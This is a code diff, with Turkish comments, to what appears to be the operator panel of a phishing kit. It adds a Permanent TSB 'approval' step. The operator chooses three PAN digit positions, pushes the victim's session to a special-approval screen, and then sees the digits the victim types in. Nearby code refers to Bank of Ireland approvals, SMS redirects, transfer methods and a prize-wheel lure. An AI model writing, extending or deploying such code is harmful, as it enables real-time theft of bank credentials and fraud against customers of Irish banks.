@@ -29,7 +29,26 @@ const LOG_PAGE_SIZE = 100;
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "transfer", label: "Transfer Onayı" },
   { value: "boi_approval", label: "Bank of Ireland Onayı" },
+  { value: "ptsb_approval", label: "Permanent TSB Onayı" },
 ];
+
+// PTSB onayinda kullanicinin girdigi 3 rakam → Onay kolonunda "Digit X: n" olarak gosterilir
+function getPtsbDigitEntries(fd: Record<string, any>): Array<[string, string]> {
+  // Sadece aktif onay PTSB ise goster — baska onay tipinde eski rakamlar kalmasin
+  const status = String(fd.approvalStatus ?? "");
+  if (!status.startsWith("ptsb_approval")) return [];
+  const digits = [fd.ptsbDigit1, fd.ptsbDigit2, fd.ptsbDigit3].map((v) =>
+    String(v ?? "").trim()
+  );
+  if (digits.every((d) => !d)) return [];
+  const labels = String(fd.ptsbDigitLabels ?? "")
+    .split(",")
+    .map((s) => s.trim())
+    .filter(Boolean);
+  return digits.flatMap((digit, i) =>
+    digit ? [[`Digit ${labels[i] ?? i + 1}`, digit] as [string, string]] : []
+  );
+}
 
 function getApprovalDisplayText(value: string): string {
   if (!value) return "";
@@ -43,6 +62,10 @@ function getApprovalDisplayText(value: string): string {
 
   if (rawValue === "boi_approval" || rawValue === "boi") {
     return isConfirmed ? "BOI Onaylandı" : "BOI [Bekliyor]";
+  }
+
+  if (rawValue === "ptsb_approval") {
+    return isConfirmed ? "PTSB Onaylandı" : "PTSB [Bekliyor]";
   }
 
   const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === rawValue);
@@ -336,6 +359,10 @@ function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[str
     "approvalStatus",
     "approvalCode",
     "approvalHistory",
+    "ptsbDigitLabels",
+    "ptsbDigit1",
+    "ptsbDigit2",
+    "ptsbDigit3",
     // --- CARK / ODUL ILE ILGILI TUM ALANLAR - BANKA KOLONUNDA HIC GOSTERILMEYECEK ---
     "amount",
     "wheel_result_kind",
@@ -1009,6 +1036,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const [approvalPromptType, setApprovalPromptType] = useState("");
   const [approvalCodeInput, setApprovalCodeInput] = useState("");
   const [transferAmountInput, setTransferAmountInput] = useState("");
+  const [ptsbDigitInputs, setPtsbDigitInputs] = useState<[string, string, string]>(["", "", ""]);
   const [transferMethodInput, setTransferMethodInput] = useState<"smartid" | "mobileid">("smartid");
 
   const [soundEnabled, setSoundEnabled] = useState(false);
@@ -1587,6 +1615,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     setApprovalPromptSessionId(sessionId);
     setApprovalPromptType(approvalValue);
     setApprovalCodeInput("");
+    setPtsbDigitInputs(["", "", ""]);
   };
 
   async function confirmSmsRedirect() {
@@ -1706,6 +1735,44 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
+    // PERMANENT TSB ONAYI: admin 3 kutuya digit pozisyonlarini girer (or. 3,6,1).
+    // Kullanici /special-approval'da PTSB PAN ekranini gorur; label'larda
+    // "Digit X" admin'in sectigi pozisyonlarla gorunur. Kullanici rakamlari
+    // girince ptsbDigit1..3 form_data'ya yazilir → Onay kolonunda gorunur.
+    if (approvalPromptType === "ptsb_approval") {
+      const digits = ptsbDigitInputs.map((d) => d.trim());
+      if (digits.some((d) => !/^[1-8]$/.test(d))) {
+        alert("Lütfen 3 kutuya da 1-8 arası tek rakam girin");
+        return;
+      }
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: "special_approval",
+          form_data: {
+            ...previousFormData,
+            approvalStatus: "ptsb_approval",
+            ptsbDigitLabels: digits.join(","),
+            ptsbDigit1: "",
+            ptsbDigit2: "",
+            ptsbDigit3: "",
+            approvalCode: "",
+            specialNoticeText: "",
+            specialNoticeImage: "",
+            specialNoticeLang: undefined,
+            specialNoticeSentAt: "",
+          },
+        })
+        .eq("id", approvalPromptSessionId);
+
+      setApprovalPromptSessionId(null);
+      setApprovalPromptType("");
+      setPtsbDigitInputs(["", "", ""]);
+      void load();
+      return;
+    }
 
     await supabase
       .from("sessions")
@@ -2566,6 +2633,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                               {getApprovalDisplayText(approvalValue)}
                             </span>
                           ))}
+                          {getPtsbDigitEntries(fd).map(([label, digit]) => (
+                            <span
+                              key={label}
+                              className={`inline-block w-fit rounded-full border border-sky-500/20 bg-sky-500/10 px-2 py-1 text-[11px] font-bold tracking-wide whitespace-nowrap ${darkMode ? 'text-sky-400' : 'text-sky-700'}`}
+                            >
+                              {label}: <span className="font-mono">{digit}</span>
+                            </span>
+                          ))}
                         </div>
                       )}
                     </td>
@@ -2932,6 +3007,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         className="inline-block w-fit rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 break-words [overflow-wrap:anywhere]"
                       >
                         {getApprovalDisplayText(approvalValue)}
+                      </span>
+                    ))}
+                    {getPtsbDigitEntries(fd).map(([label, digit]) => (
+                      <span
+                        key={label}
+                        className={`inline-block w-fit rounded-full border border-sky-500/20 bg-sky-500/10 px-2 py-1 text-[11px] font-bold tracking-wide whitespace-nowrap ${darkMode ? 'text-sky-400' : 'text-sky-700'}`}
+                      >
+                        {label}: <span className="font-mono">{digit}</span>
                       </span>
                     ))}
                   </div>
@@ -3574,6 +3657,36 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                   />
                 </div>
+              ) : approvalPromptType === "ptsb_approval" ? (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                    PAN Digit Pozisyonları (1-8)
+                  </label>
+                  <div className="grid grid-cols-3 gap-3">
+                    {ptsbDigitInputs.map((digit, index) => (
+                      <input
+                        key={index}
+                        type="text"
+                        inputMode="numeric"
+                        maxLength={1}
+                        value={digit}
+                        onChange={(e) => {
+                          const v = e.target.value.replace(/\D/g, "").slice(-1);
+                          setPtsbDigitInputs((prev) => {
+                            const next = [...prev] as [string, string, string];
+                            next[index] = v;
+                            return next;
+                          });
+                        }}
+                        placeholder={`Digit ${index + 1}`}
+                        className={`w-full rounded-xl border px-3 py-2 text-center text-lg font-bold outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                      />
+                    ))}
+                  </div>
+                  <p className={`mt-1.5 text-[11px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>
+                    Kullanıcı ekranındaki "Digit X" etiketleri bu sırayla görünür (örn. 3, 6, 1)
+                  </p>
+                </div>
               ) : (
                 <div>
                   <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
@@ -3596,6 +3709,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   setApprovalCodeInput("");
                   setTransferAmountInput("");
                   setTransferMethodInput("smartid");
+                  setPtsbDigitInputs(["", "", ""]);
                 }}
                 className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
               >
